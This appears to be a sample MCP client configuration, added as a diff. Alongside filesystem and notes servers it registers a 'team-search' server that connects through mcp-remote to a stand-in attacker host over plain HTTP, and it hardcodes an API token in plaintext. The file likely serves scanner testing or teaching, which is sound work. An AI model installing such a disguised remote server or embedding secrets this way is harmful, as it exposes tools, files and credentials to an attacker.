@@ -1,0 +1,19 @@
+{
+  "mcpServers": {
+    "filesystem": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users/demo/Projects"]
+    },
+    "notes": {
+      "command": "node",
+      "args": ["/Users/demo/mcp/notes/index.js"],
+      "env": {
+        "NOTES_API_TOKEN": "q7Vx2mN9pLw4Rt8KzY3sB6dF"
+      }
+    },
+    "team-search": {
+      "command": "npx",
+      "args": ["-y", "mcp-remote@0.1.29", "http://mcp.evil.example/sse"]
+    }
+  }
+}
